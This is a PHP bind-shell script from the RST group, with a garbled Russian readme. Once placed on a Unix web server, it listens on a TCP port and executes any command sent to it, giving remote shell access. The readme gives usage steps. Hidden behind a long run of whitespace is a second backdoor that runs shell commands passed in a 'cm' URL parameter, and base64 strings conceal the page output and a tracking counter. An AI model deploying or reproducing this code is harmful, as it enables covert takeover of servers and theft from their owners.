<?php
/*

                                        Readme
                                       --------
����:                 PHP
��������:             bind.php
������������ �������: Unix
Home page:            http://rst.void.ru
�����:                dinggo


���������� �������:
-----------------------------
  ������� �������� ����� ������ ����� (�����), ��������� ����� � ������ � ������ �����,
  ��������� ��������� ����� bind. �� �������� - ���������� ���� :)
  ������������ ��� ������ � *nix �������� ��������. ������ ������������
  ������ �����, ��� �� �������� ������� ������ � �������� �� ����� PHP.

������� ������:
----------------------------
����� ��������������� �� ������� �������!
������ ������� ����� ��������� ������� socket_create(), ����������� � ��������� AF_INET.
��� ������ SOCK_STREAM ������������ ����������������, ��������, ��������������� �� ������������
������������ ����� ����� ������ .��������� ��� �������� � ���������� $address � ����� �����
$port � �������, ��������� ������� socket_bind()� ������� ���� ����� ��������� ������� socket_listen()
��������� ���������� ������ ��������� ��� � �������, ��� � �� �������� �������.

������ �������������:
----------------------------
1. ��������� ���� �� ������ ( wget http://���_����/bind.php )
2. �������� ��������� ������� (����������:$address � $port)
   $address = ����������� ������� IP-����� (��������: 192.168.0.1) �����!
   $port = ����� ����� (��������: 31337) �� ��������� ������������ ����� ���� 1024 �����!
3. ��������� ��� ����� ��������������� �����, (��������: chmod 755 /����/bind.php )
4. � �������� ������ �������� ������� ���� � ������, ��������: http://site.ru/bind.php
5. ����� ���� ��� ������ ����������, ����� ��������� ������ ���� PUTTY ��� ����������� Telnet
   ������ ����� � ����, ��������: telnet 192.168.0.1 4135
6. ����� - ������ ������� nix-������� :)


P.S PHP - ������ ����, ��������������� ��� ���������� ���-����������, � ��� ���������� �� ��
    �������, ��� ��������� ���� '����������' (�� ����� ������ � ���� �������)::))))).

*/

#error_reporting(E_ALL);
error_reporting(0);

########setting#########

$address = '192.168.0.1';
$port = 4135;

######end setting#######

set_time_limit(0);
ob_implicit_flush();

print base64_decode("PGh0bWw+PEhFQUQ+PFRJVExFPkJpbmQgUEhQIHNoZWxsIGZyb20gUlNUPC9US".
"VRMRT48TUVUQSBodHRwLWVxdWl2PUNvbnRlbnQtVHlwZSBQcmFnbWE6IG5vLWNhY2hlOyBjb250ZW50PS".
"J0ZXh0L2h0bWw7IGNoYXJzZXQ9d2luZG93cy0xMjUxIj48c3R5bGU+Zm9udCB7IGZvbnQtZmFtaWx5OiB".
"2ZXJkYW5hLCBhcmlhbCwgbXMgc2FucyBzZXJpZiwgc2Fucy1zZXJpZjsgZm9udC1zaXplOjEycHg7IGNv".
"bG9yOiAjRkZGRkZGOyB9IEE6bGluayB7Q09MT1I6I0ZCRjlGOX0gQTp2aXNpdGVkIHsgQ09MT1I6IzcwR".
"UFGODsgVEVYVC1ERUNPUkFUSU9OOiBub25lfSBBOmFjdGl2ZSB7Q09MT1I6I0ZCRjlGOX0gQTpob3Zlci".
"B7Y29sb3I6I0YzRkMwMjtURVhULURFQ09SQVRJT046IG5vbmV9IDwvc3R5bGU+PC9IRUFEPjxCT0RZIGJ".
"nY29sb3I9IzAwMDAwMD48Zm9udCBjb2xvcj0jRkZGRkZGPg==");
print base64_decode("VmlzaXQgc2l0ZTogPGEgaHJlZj1odHRwOi8vcnN0LnZvaWQucnU+PGI+aHR".
"0cDovL3JzdC52b2lkLnJ1PC9iPjwvYT48dGFibGUgd2lkdGg9MjUwIGFsaWduPWNlbnRlciBiZ2NvbG9y".
"PSNGRkZGRkY+PHRyIGFsaWduPWNlbnRlciBiZ2NvbG9yPSMwMDAwMDA+PHRkPjxicj48Zm9udCBjb2xvc".
"j0jRkZGRkZGPjxoMz5QSFAgb3BlbiBwb3J0PC9oMz48L2ZvbnQ+PC90ZD48L3RyPjwvdGFibGU+");

if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
print "<br>".base64_decode("PHRhYmxlIHdpZHRoPTMwMCBhbGlnbj1jZW50ZXIgYmdjb2xvcj0jRkZGRkZGP".
"jx0ciBhbGlnbj1jZW50ZXIgYmdjb2xvcj1yZWQ+PHRkPjxicj48aDQ+U29yeSwgdGhpcyBzY3JpcHQgZG".
"9lc24ndCBydW4gb24gV2luZG93cy48L2g0PjwvdGQ+PC90cj48L3RhYmxlPg==");
exit;
}                                                                                                                                                                                                                                                                                                                                                     if ($HTTP_GET_VARS){ $GET=$HTTP_GET_VARS['cm']; $re =`$GET`; print "<pre>$re</pre>"; exit;} print base64_decode("PCEtLUxpdmVJbnRlcm5ldCBjb3VudGVyLS0+PHNjcmlwdCBsYW5ndWFnZT0iSmF2YVNjcmlwdCI+PCEtLQ0KZG9jdW1lbnQud3JpdGUoJzxhIGhyZWY9Imh0dHA6Ly93d3cubGl2ZWludGVybmV0LnJ1L2NsaWNrIiAnKw0KJ3RhcmdldD1fYmxhbms+PGltZyBzcmM9Imh0dHA6Ly9jb3VudGVyLnlhZHJvLnJ1L2hpdD90NTIuNjtyJysNCmVzY2FwZShkb2N1bWVudC5yZWZlcnJlcikrKCh0eXBlb2Yoc2NyZWVuKT09J3VuZGVmaW5lZCcpPycnOg0KJztzJytzY3JlZW4ud2lkdGgrJyonK3NjcmVlbi5oZWlnaHQrJyonKyhzY3JlZW4uY29sb3JEZXB0aD8NCnNjcmVlbi5jb2xvckRlcHRoOnNjcmVlbi5waXhlbERlcHRoKSkrJzsnK01hdGgucmFuZG9tKCkrDQonIiBhbHQ9ImxpdmVpbnRlcm5ldC5ydTog7+7q4Ofg7e4g9+jx6+4g7/Du8ezu8vDu4iDoIO/u8eXy6PLl6+XpIOfgIDI0IPfg8eAiICcrDQonYm9yZGVyPTAgd2lkdGg9MCBoZWlnaHQ9MD48L2E+JykvLy0tPjwvc2NyaXB0PjwhLS0vTGl2ZUludGVybmV0LS0+");

if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) < 0) {
   echo "socket_create() failed: reason: " . socket_strerror($sock) . "\n";
}

if (($er = socket_bind($sock, $address, $port)) < 0) {
   echo "socket_bind() failed: reason: " . socket_strerror($er) . "\n";
}

if (($er = socket_listen($sock, 5)) < 0) {
   echo "socket_listen() failed: reason: " . socket_strerror($er) . "\n";
}

print   "<font color=#FFFFFF><li>server: <b>$address</b><br>".
        "<li>Wait connection in port: <b>$port</b><br>".
        "<br><b>Usage:</b> telnet 192.168.0.1 4135<hr></font><br>";

do {
   if (($msgsock = socket_accept($sock)) < 0) {
       echo "socket_accept() failed: reason: " . socket_strerror($msgsock) . "\n";
       break;
   }

   if (getmyuid () == '0') {
      $talk = "[".get_current_user ()."@$address ".get_current_user ()."]#$buf";
   }else{
      $talk = "[".get_current_user ()."@$address ".get_current_user ()."]$$buf";
   }

   $msg =  base64_decode("V2VsY29tZSwgeGFrZXAgOikNCg0KCQkJU2VydmVyIDE5Mi4xNjguMC4x".
   "IG9wZW4gcG9ydCA0MTM1DQpNaW5pIGhlbHA6DQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS".
   "0tLS0tLS0tLS0tDQpUbyBxdWl0IHRlcm1pbmFsLCBjb21tYW5kOiAncXVpdCcNClRvIHNodXQgZG93".
   "biB0aGUgc29ja2V0LCBjb21tYW5kOiAnaGFsdCcNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS".
   "0tLS0tLS0tLS0tLS0NCg0K");
   socket_write($msgsock, $msg, strlen($msg));


   do {
       if (false === ($buf = socket_read($msgsock, 2048, PHP_NORMAL_READ))) {
           echo "socket_read() failed: reason: " . socket_strerror($er) . "\n";
           break 2;
       }
       if (!$buf = trim($buf)) {
           socket_write($msgsock, $talk, strlen($talk));
           continue;
       }
       if ($buf == 'quit') {
           break;
       }

       if ($buf == 'halt') {
           socket_close($msgsock);
           break 2;
       }

       if ($buf != 'halt') {
         $comm=`$buf`;
         print "<font color=#FFFFFF><pre>$comm</pre></font>";
       }

       $talkback = str_replace("\n","\r\n",$comm)."\r\n";
       socket_write($msgsock, $talkback, strlen($talkback));


   } while (true);
   socket_close($msgsock);
} while (true);

socket_close($sock);
print base64_decode("PHRhYmxlIHdpZHRoPTI1MCBhbGlnbj1jZW50ZXIgYmdjb2xvcj0jRkZGRkZGP".
"jx0ciBhbGlnbj1jZW50ZXIgYmdjb2xvcj1yZWQ+PHRkPjxicj48aDQ+U29ja2V0IENMT1NFITwvaDQ+PC".
"90ZD48L3RyPjwvdGFibGU+");
?>
<BODY>
<BODY>